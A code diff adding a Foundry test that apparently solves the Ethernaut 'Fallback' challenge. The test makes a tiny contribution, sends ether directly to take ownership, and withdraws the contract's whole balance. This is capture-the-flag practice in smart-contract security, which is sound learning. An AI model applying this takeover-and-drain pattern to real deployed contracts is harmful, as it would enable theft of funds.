@@ -58,6 +58,37 @@ contract FallbackTest is Test {
         Fallback instance = Fallback(payable(instanceAddress));
 
         /* Level Hack */
+        // 0. Check current owner
+        address owner = instance.owner();
+        emit log_named_address("owner", owner);
+        assertEq(owner, address(fallbackFactory));
+
+        uint256 contribution = instance.getContribution();
+        assertEq(contribution, 0);
+
+        // 1. Contribute < 0.001 ether
+        vm.deal(eoa, 1 ether);
+        instance.contribute{value: 0.0005 ether}();
+        contribution = instance.getContribution();
+        assertEq(contribution, 0.0005 ether);
+
+        // 2. Transfer ether directly
+        payable(instance).call{value: 0.1 ether}("");
+
+        // 3. Check owner
+        owner = instance.owner();
+        emit log_named_address("owner", owner);
+        assertEq(owner, address(eoa));
+
+        // 4. Withdraw full balance
+        uint256 balance = address(instance).balance;
+        emit log_named_uint("balance", balance);
+
+        instance.withdraw();
+
+        balance = address(instance).balance;
+        emit log_named_uint("balance", balance);
+        assertEq(balance, 0);
 
         /* Level Submit */
         // Start recording logs to capture level completed log
